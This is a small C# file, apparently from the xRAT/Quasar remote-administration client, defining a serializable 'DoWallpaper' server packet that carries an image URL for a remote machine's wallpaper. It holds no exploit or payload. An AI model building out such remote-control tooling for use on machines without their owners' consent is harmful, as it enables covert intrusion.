using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoWallpaper : IPacket
{
	public string URL { get; set; }

	public DoWallpaper()
	{
	}

	public DoWallpaper(string url)
	{
		URL = url;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
